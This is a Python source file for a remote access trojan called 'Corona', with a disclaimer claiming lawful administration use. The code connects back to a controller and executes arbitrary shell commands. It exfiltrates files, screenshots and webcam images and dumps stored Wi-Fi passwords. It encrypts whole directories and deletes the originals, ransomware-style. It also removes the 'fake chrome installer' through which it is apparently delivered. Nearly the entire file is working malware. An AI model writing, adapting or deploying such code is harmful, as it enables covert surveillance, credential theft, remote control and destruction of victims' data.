#Created by Xand

#Disclaimer: This reverse shell should only be used in the lawful, remote administration of authorized systems. Accessing a computer network without authorization or permission is illegal.


import socket
import time
import platform
import subprocess
import os
import re
from Crypto.Hash import SHA256
from Crypto.Cipher import AES
from Crypto import Random
import cv2
import numpy as np
from PIL import ImageGrab

port = 4000
host = socket.gethostbyname(socket.gethostname())

#tries to connect back to the server
def establish_connection():
    global sock
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, port))
            break
        except socket.error as err:
            time.sleep(120) #try to reconnect after 2 minutes


    sock.send(get_platform_info()) #send platform info back to server

    #check which command has been recieved from the server
    #keep listening for comamds
    while True:
        cmd = sock.recv(65536).decode()
        if cmd == " ":
            sock.send('\033[1;32mCorona:~\033[1;m'.encode() + str(os.getcwd() + "> ").encode()) #send current working directory back to server
        elif "get" in cmd:
            send_file(sock, cmd[4:])
        elif "send" in cmd:
            receive_file(sock, cmd[5:])
        elif cmd == "screenshot":
            screenshot(sock)
        elif cmd == "camshot":
            capture_webcam_Image(sock)
        elif cmd == "wifi_passwords":
            get_known_wifi_password(sock)
        elif cmd == "conn check":
            pass
        elif "encrypt" in cmd:
            cmd = cmd.split(" ", 2)
            if len(cmd) == 2:
                encrypt_All_Files(sock, "".join(cmd[1]), "".join(os.getcwd()))
            elif len(cmd) == 3:
                encrypt_All_Files(sock, "".join(cmd[1]), "".join(cmd[2]))
        elif "decrypt" in cmd:
            cmd = cmd.split(" ", 2)
            if len(cmd) == 2:
                decrypt_All_Files(sock, "".join(cmd[1]), "".join(os.getcwd()))
            elif len(cmd) == 3:
                decrypt_All_Files(sock, "".join(cmd[1]), "".join(cmd[2]))
        elif cmd[:2] == 'cd':
            #change directory
            try:
                os.chdir(cmd[3:])
                result = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = result.stdout.read() + result.stderr.read()
                result = "\n" + result.decode()
                if "The system cannot find the path specified." in result:
                    result = "\n"
                    sock.send(str(result).encode() + '\033[1;32mCorona:~\033[1;m'.encode() + str(os.getcwd() + "> ").encode())
                else:
                    sock.send(str(result).encode() + '\033[1;32mCorona:~\033[1;m'.encode() + str(os.getcwd() + "> ").encode())
            except(FileNotFoundError, IOError):
                sock.send("Directory does not exist!!! \n".encode() + '\033[1;32mCorona:~\033[1;m'.encode() + str(os.getcwd() + "> ").encode())
        else:
            #return terminal output back to server
            terminal_output = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            terminal_output = terminal_output.stdout.read() + terminal_output.stderr.read()
            terminal_output = terminal_output.decode()
            sock.send(str(terminal_output).encode() + '\033[1;32mCorona:~\033[1;m'.encode() + str(os.getcwd() + "> ").encode())


#sends file to server
def send_file(conn, usrFile):
        conn.send(usrFile.encode())
        #checks if file exists
        if not os.path.exists(usrFile):
            conn.send("File does not exist!!!".encode() + '\033[1;32mCorona:~\033[1;m'.encode() + str(os.getcwd() + "> ").encode())
        else:
            conn.send('\033[1;32mCorona:~\033[1;m'.encode() + str(os.getcwd() + "> ").encode())
            time.sleep(1)
            fileSize = os.path.getsize(usrFile)
            conn.send(str(fileSize).encode())
            time.sleep(1)

            with open(usrFile, 'rb') as file:
                data = file.read(1024)
                if fileSize == 0:
                    pass
                elif fileSize < 1024:
                     conn.send(data)
                     file.close()
                else:
                    while data:
                        conn.send(data)
                        data = file.read(1024)
                    file.close()


#receives file from server
def receive_file(conn, usrFile):
    fileSize = int(conn.recv(1024).decode())
    if fileSize == 0: #if file is empty do nothing
        #send current working directory back to server
        conn.send('\033[1;32mCorona:~\033[1;m'.encode() + str(os.getcwd() + "> ").encode())
        pass
    else:
        #open a new file
        with open(usrFile, 'wb') as file:
            if fileSize < 1024:
                data = conn.recv(1024)
                file.write(data)
                file.close()
            else:
                data = conn.recv(1024)
                totalFileRecv = len(data)

                while totalFileRecv < fileSize:
                    totalFileRecv += len(data)
                    file.write(data)
                    data = conn.recv(1024)
                file.write(data)
                file.close()
        conn.send('\033[1;32mCorona:~\033[1;m'.encode() + str(os.getcwd() + "> ").encode())


#gets all know wifi password on machine
def get_known_wifi_password(conn):
    wifi_name_list = []
    #send command to terminal
    terminal_cmd = "netsh wlan show profiles"
    wifi_name_result = subprocess.Popen(terminal_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    #store result from terminal
    wifi_name = (wifi_name_result.stdout.read() + wifi_name_result.stderr.read()).decode().split("\n")

    #get all SSID and store them in wifi_name_list
    for name in wifi_name:
        if "All User Profile" in name:
            res = name.partition(": ")[2]
            res = res.replace("\r", "")
            wifi_name_list.append(res)

    wifi_and_password = []

    for wifi in wifi_name_list: #loop through wifi name
        terminal_cmd = "netsh wlan show profiles {} key=clear".format(str(wifi))
        wifi_password = subprocess.Popen(terminal_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                         stdin=subprocess.PIPE)
        wifi_password = (wifi_password.stdout.read() + wifi_password.stderr.read()).decode()

        try:#get password next to "Key content"
            wifi_password = re.search("(?<=Key Content).*", wifi_password)[0] #positive lookbehind assertion regex
            wifi_and_password.append("\t" + wifi + wifi_password.lstrip() + "\n")
        except:#if password does not exist label wifi as open wifi
            wifi_and_password.append("\t" + wifi + ": (Open Wifi)" + "\n")
    results = " ".join(wifi_and_password)#convert result to string
    conn.send(results.encode() + '\033[1;32mCorona:~\033[1;m'.encode() + str(os.getcwd() + "> ").encode()) #send result back to server


#returns client system information
def get_platform_info():
    client_platform_info = str(platform.uname()).encode()
    return client_platform_info


#send a screenshot back to server
def screenshot(conn):
    conn.send('\033[1;32mCorona:~\033[1;m'.encode() + str(os.getcwd() + "> ").encode())#send current working directory back to server
    img = ImageGrab.grab()#capture image
    img_np = np.array(img)
    frame = cv2.cvtColor(img_np, cv2.COLOR_RGB2BGR)
    imgName =  "img.jpg"#image name
    cv2.imwrite(imgName, frame)#write image to a file
    cv2.destroyAllWindows()

    fileSize = os.path.getsize(imgName)
    conn.send(str(socket.gethostbyname(socket.gethostname())).encode() +  "_screenshot".encode())
    time.sleep(1)
    conn.send(str(fileSize).encode())
    with open(imgName, 'rb') as file:
        content = file.read(1024)
        while content:
            conn.send(content)
            content = file.read(1024)
    file.close()
    os.remove("img.jpg") #remove image from client machine


#send webcam image back to server
def capture_webcam_Image(conn):
    conn.send('\033[1;32mCorona:~\033[1;m'.encode() + str(os.getcwd() + "> ").encode())
    capture = cv2.VideoCapture(0)
    ret, frame = capture.read() #capture frame by frame
    clientImage = "img.jpg" #image name
    cv2.imwrite(clientImage, frame)#write image to a file
    capture.release()#release capture
    cv2.destroyAllWindows()

    fileSize = os.path.getsize(clientImage)
    conn.send(str(socket.gethostbyname(socket.gethostname())).encode() + "_camshot".encode())
    time.sleep(1)
    conn.send(str(fileSize).encode())
    #send file content
    with open(clientImage, 'rb') as file:
        content = file.read(1024)
        while content:
            conn.send(content)
            content = file.read(1024)
    file.close()
    os.remove(clientImage) #remove image from client machine


#encrypt all files in directory provided
def encrypt_All_Files(conn, key, directory):
    file_counter = 0
    hashed_key = SHA256.new(key.encode('utf-8')).digest() #hash for extra randomisation
    if os.path.exists(directory):
        #store all files in directory in file_path
        file_paths = []
        for root, directories, files in os.walk(directory):
            for filename in files:
                filepath = os.path.join(root, filename)
                file_paths.append(filepath)

        #encrypt all files listed in file_path
        for file in file_paths:
            file_counter += 1
            filename = file.split("\\")
            filename = "".join(filename[-1])

            encrypted_file = os.path.join(directory, "(Encrypted)" + filename)#append Encrypted to the beginning of the file
            filesize = str(os.path.getsize(file)).rjust(AES.block_size, '0')#pad each block by 16
            IV = Random.new().read(AES.block_size) #initialization vector for randomisation

            encrypt_file = AES.new(hashed_key, AES.MODE_CBC, IV)

            with open(file, 'rb') as usrFile:
                with open(encrypted_file, 'wb') as outfile:
                    outfile.write(filesize.encode('utf-8'))
                    outfile.write(IV)

                    while True:
                        block = usrFile.read(65536)
                        if len(block) == 0:
                            break
                        elif len(block) % 16 != 0:
                            block += b' ' * (16 - (len(block) % 16)) #pad the rest of data to equal 16


                        outfile.write(encrypt_file.encrypt(block)) #encrypt block
                    usrFile.close()
                os.remove(file)

        conn.send("\t [+] ".encode() + str(file_counter).encode() + " files has been encrypted!!! \n".encode() + '\033[1;32mCorona:~\033[1;m'.encode() + str(os.getcwd() + "> ").encode())
    else:
           conn.send("\t [+] Directory or file specified does not exist!!! \n".encode() + '\033[1;32mCorona:~\033[1;m'.encode() + str(os.getcwd() + "> ").encode())
           pass

#decrypt all files in directory provided
def decrypt_All_Files(conn, key, directory):
    file_counter = 0
    hashed_key = SHA256.new(key.encode('utf-8')).digest()
    if os.path.exists(directory):
        file_paths = []

        for root, directories, files in os.walk(directory):
            for filename in files:
                filepath = os.path.join(root, filename)
                file_paths.append(filepath)

        for usrFile in file_paths:
            file_counter += 1
            outputFile = usrFile.split("\\")
            outputFile = "".join(outputFile[-1])
            outputFile = outputFile.replace("(Encrypted)", "") #remove (Encrypted from file name)
            outputFile = os.path.join(directory, outputFile)


            with open(usrFile, 'rb') as encrypted_file:
                filesize = int(encrypted_file.read(16))
                IV = encrypted_file.read(AES.block_size) #initialization vector for randomisation
                decrypt_file = AES.new(hashed_key, AES.MODE_CBC, IV)

                with open(outputFile, 'wb') as decrypted_file:
                    while True:
                        block = encrypted_file.read(65536)

                        if len(block) == 0:
                            break
                        decrypted_file.write(decrypt_file.decrypt(block)) #decrypt block
                    decrypted_file.truncate(filesize)

            os.remove(usrFile)
        conn.send("\t [+] ".encode() + str(file_counter).encode() + " files has been decrypted!!! \n".encode() + '\033[1;32mCorona:~\033[1;m'.encode() + str(os.getcwd() + "> ").encode())
    else:
         conn.send("\t [+] Directory or file specified does not exist!!! \n".encode() + '\033[1;32mCorona:~\033[1;m'.encode() + str(os.getcwd() + "> ").encode())
         pass


#removes fake chrome installer
def removeFakeChrome():
    time.sleep(2)

    dest_path = os.getcwd().split('\\')
    del dest_path[3:]
    dest_path = "\\".join(dest_path)
    chromeFolder = dest_path + "\Chrome"

    file = open(chromeFolder + "\\filePath.txt", "r")
    chromeSetupFile = file.read()
    os.remove(chromeSetupFile)
    file.close()

    filepath = chromeFolder + "\\filePath.txt"
    os.remove(filepath)

try:
    removeFakeChrome()
except:
    pass

establish_connection()